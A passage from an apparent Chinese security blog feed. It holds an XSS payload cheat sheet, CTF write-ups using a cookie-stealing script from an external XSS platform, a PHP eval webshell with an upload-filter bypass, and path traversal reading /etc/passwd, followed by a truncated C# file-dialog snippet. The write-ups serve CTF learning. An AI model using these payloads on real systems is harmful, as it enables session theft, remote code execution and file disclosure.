%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e %3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e %3cscript%3ealert(%22xss%22)%3c/script%3e/index.html %3f.jsp %3f.jsp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Vulnerable'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Vulnerable'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> ?sql_debug=1 a%5c.aspx a.jsp/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Vulnerable'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> a/ a?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Vulnerable'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> "><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Vulnerable'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> ';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt'--&amp;&amp; %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E %3Cscript%3Ealert(document. domain);%3C/script%3E&amp; %3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID= <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> &lt;IMG src=javascript:alert('XSS')> &lt;IMG src=JaVaScRiPt:alert('XSS')> &lt;IMG src=JaVaScRiPt:alert("XSS")> &lt;IMG src=javascript:alert('XSS')> &lt;IMG src=javascript:alert('XSS')> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jav ascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jav ascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jav ascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> "&lt;IMG src=java\0script:alert(\"XSS\")>";' > out <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span> javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">a<span class="token operator">=</span><span class="token operator">/</span><span class="token constant">XSS</span><span class="token operator">/</span><span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>source<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BODY</span> <span class="token attr-name">BACKGROUND</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> &lt;BODY ONLOAD=alert('XSS')> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">DYNSRC</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">LOWSRC</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BGSOUND</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&amp;&#123;alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LAYER</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xss.ha.ckers.org/a.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>layer</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LINK</span> <span class="token attr-name">REL</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>vbscript:msgbox(<span class="token punctuation">"</span>XSS<span class="token punctuation">"</span>)<span class="token punctuation">'</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mocha:[code]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>livescript:[code]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">HTTP-EQUIV</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">CONTENT</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0;url=javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> &lt;IFRAME src=javascript:alert('XSS')><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>IFRAME</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FRAMESET</span><span class="token punctuation">></span></span>&lt;FRAME src=javascript:alert('XSS')><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FRAME</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FRAMESET</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TABLE</span> <span class="token attr-name">BACKGROUND</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DIV</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">STYLE</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token property">javascript</span><span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DIV</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">STYLE</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">behaviour</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">'http://www.how-to-hack.org/exploit.html'</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DIV</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">STYLE</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">expression</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STYLE</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token atrule"><span class="token rule">@im</span>\port<span class="token string">'\ja\vasc\ript:alert("XSS")'</span><span class="token punctuation">;</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STYLE</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">STYLE</span></span><span class="token punctuation">='</span><span class="token attr-value"><span class="token property">xss</span><span class="token punctuation">:</span>expre\<span class="token function">ssion</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STYLE</span> <span class="token attr-name">TYPE</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STYLE</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STYLE</span> <span class="token attr-name">TYPE</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">.XSS</span><span class="token punctuation">&#123;</span><span class="token property">background-image</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"javascript:alert('XSS')"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STYLE</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>A</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>XSS<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>A</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STYLE</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">BODY</span><span class="token punctuation">&#123;</span><span class="token property">background</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"javascript:alert('XSS')"</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STYLE</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BASE</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);//<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> getURL("javascript:alert('XSS')") a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d); <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>XML</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> "> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BODY</span> <span class="token attr-name">ONLOAD</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a();<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>"</span> <span class="token attr-name">&lt;SCRIPT</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xss.ha.ckers.org/xss.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(<span class="token punctuation">'</span>XSS<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span> <span class="token attr-name">&lt;!--#exec</span> <span class="token attr-name">cmd</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/bin/echo <span class="token punctuation">'</span>&lt;SCRIPT SRC<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token attr-name">--</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js>&lt;/SCRIPT>'"--></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMG</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span> <span class="token attr-name">a</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>><span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xss.ha.ckers.org/a.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span> &lt;SCRIPT ="><span class="token script"><span class="token language-javascript"><span class="token string">" src="</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>xss<span class="token punctuation">.</span>ha<span class="token punctuation">.</span>ckers<span class="token punctuation">.</span>org<span class="token operator">/</span>a<span class="token punctuation">.</span>js"<span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span> <span class="token attr-name">a</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>><span class="token punctuation">"</span></span> <span class="token attr-name">''</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xss.ha.ckers.org/a.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span> <span class="token attr-name">"a</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>><span class="token punctuation">'</span></span><span class="token attr-name">"</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xss.ha.ckers.org/a.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;SCRI"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span>PT src="http://xss.ha.ckers.org/a.js"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的都是xss的payload，这种构造xss的方式应该还有很多，但是学习肯定要从最简单的开始学啊，先学这个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，尝试用payload输入第一个框里面，弹出<code>1</code><br>注册平台，拿到恶意链接，使用下面的payload发送，在xss平台上面拿到cookie的值即为flag<br><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>sCRiPt sRC<span class="token operator">=</span><span class="token comment">//xss.pt/FeDc>&lt;/sCrIpT></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><code>ctfhub&#123;ca231bb3974a47bbdc54c1e0&#125;</code></p><h1 id="2-上传之无验证"><a href="#2-上传之无验证" class="headerlink" title="2.上传之无验证"></a>2.上传之无验证</h1><p>无限制，直接上传php一句话<code>&lt;?php @eval($_POST[hack]);?&gt;</code>，连蚁剑，flag在html目录下，<code>&lt;?php // ctfhub&#123;397c14a9851b9087aeedfd47&#125;</code></p><h1 id="3-上传之前端验证"><a href="#3-上传之前端验证" class="headerlink" title="3.上传之前端验证"></a>3.上传之前端验证</h1><p>前端限制，上传png后直接抓包改后缀名为.php可绕过，也可以直接关js，这里采用第一种方式.<br><img src="/2020/11/24/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web/1.png" alt><br><img src="/2020/11/24/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web/2.png" alt><br><code>ctfhub&#123;973f0b7f8a29e85d2a91a1c7&#125;</code></p><p>~下次更~</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>virink_2019_files_share</title>
      <link href="2020/11/23/virink-2019-files-share/"/>
      <url>2020/11/23/virink-2019-files-share/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>~懒狗的一天，死&lt;作业不少&gt;，做个简单题陶冶下情操~</p><h2 id="1-first-step"><a href="#1-first-step" class="headerlink" title="1.first step"></a>1.first step</h2><p>首先在源码里发现了hint<code>&lt;!-- Hint : flag in f1ag_Is_h3re --&gt;</code></p><p>然后发现/upload/目录没有关掉<code>http://4eeb1aa9-5baf-46b5-bdd6-53ae42a824a0.node3.buuoj.cn/uploads/</code></p><p>点击里面的<code>preview</code>发现可以下载文件，那就抓下包试一试。</p><h2 id="2-抓包"><a href="#2-抓包" class="headerlink" title="2.抓包"></a>2.抓包</h2><p>抓包发现第一行的请求语句为<code>GET /preview?f=favicon.ico HTTP/1.1</code>。<br>尝试目录穿越，尝试读取<code>/etc/passwd</code>文件<code>GET /preview?f=../../../../../etc/passwd HTTP/1.1</code>。<br><img src="/2020/11/23/virink-2019-files-share/1.png" alt><br>再次尝试payload</p><p><code>GET /preview?f=../etc../passwd HTTP/1.1</code>，返回<code>&#123;&quot;msg&quot;:&quot;File yetcpasswd not found!&quot;,&quot;code&quot;:1&#125;</code><br><code>GET /preview?f=y../etc.y./passwd HTTP/1.1</code>，返回<code>&#123;&quot;msg&quot;:&quot;File yetc.passwd not found!&quot;,&quot;code&quot;:1&#125;</code></p><p>猜测应为寻找<code>/</code>字符，找到的话，则将<code>/</code>前的两位包含<code>/</code>替换为空。<br>考虑到也许这种过滤只执行一次，就是若上传内容为<code>....//</code>，检测到<code>/</code>，则被替换为<code>../</code>，下一个<code>/</code>会被转义<code>\</code>，造成<code>../</code>，则可使用双写绕过。</p><h2 id="3-flag"><a href="#3-flag" class="headerlink" title="3.flag"></a>3.flag</h2><p>找flag，首先尝试<code>GET /preview?f=....//....//....//....//....//....//etc..//passwd HTTP/1.1</code>拿到文件，再根据提示<br><code>&lt;!-- Hint : flag in f1ag_Is_h3re --&gt;</code>，尝试<code>GET /preview?f=....//....//....//....//....//....//f1ag_Is_h3re HTTP/1.1</code>，返回<code>&#123;&quot;msg&quot;:&quot;File ..\/..\/..\/..\/..\/..\/etc not found!&quot;,&quot;code&quot;:1&#125;</code>，没找到文件，猜测文件在<code>/f1ag_Is_h3re/flag</code>里面，用下面payload获取flag<br><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;preview?f&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;f1ag_Is_h3re..&#x2F;&#x2F;flag HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="/2020/11/23/virink-2019-files-share/2.png" alt="capture the flag"><br><code>flag&#123;33d05b99-8ed6-4b7e-a9f2-6f1a1413d3ae&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Csharp选择文件路径</title>
      <link href="2020/11/23/Csharp%E9%80%89%E6%8B%A9%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/"/>
      <url>2020/11/23/Csharp%E9%80%89%E6%8B%A9%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="使用浏览按钮选择文件"><a href="#使用浏览按钮选择文件" class="headerlink" title="使用浏览按钮选择文件"></a>使用浏览按钮选择文件</h2><p>借鉴整理于<a href="https://jingyan.baidu.com/article/09ea3edec10aac81afde392f.html">百度知道</a><br><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">// 选择文件：</span><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">string</span></span> <span class="token function">SelectPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">//这里可以用一个button_click事件来实现</span><span class="token punctuation">&#123;</span>    <span class="token class-name"><span class="token keyword">string</span></span> path <span class="token operator">=</span> <span class="token keyword">string</span><span class="token punctuation">.</span>Empty<span class="token punctuation">;</span>    <span class="token class-name"><span class="token keyword">var</span></span> openFileDialog <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Microsoft<span class="token punctuation">.</span>Win32<span class="token punctuation">.</span>OpenFileDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        Filter <span class="token operator">=</span> <span class="token string">"Files (*.*)|*.*"</span><span class="token comment">//如果需要筛选txt文件（"Files (*.txt)|*.txt"）</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>openFileDialog<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        path <span class="token operator">=</span> openFileDialog<span class="token punctuation">.</span>FileName<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> path<span class="token punctuation">&#125;</span><span class="token comment">// 选择路径(目录)</span><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">string</span></span> <span class="token function">SelectPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name"><span class="token keyword">string</span></span> path <span class="token operator">=</span> <span class="token keyword">string</span><span class="token punctuation">.</span>Empty<span class="token punctuation">;</span>    <span class="token class-name">System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">.</span>FolderBrowserDialog</span> fbd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">.</span>FolderBrowserDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fbd<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">.</span>DialogResult<span class="token punctuation">.</span>OK<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        path <span class="token operator">=</span> fbd<span class="token 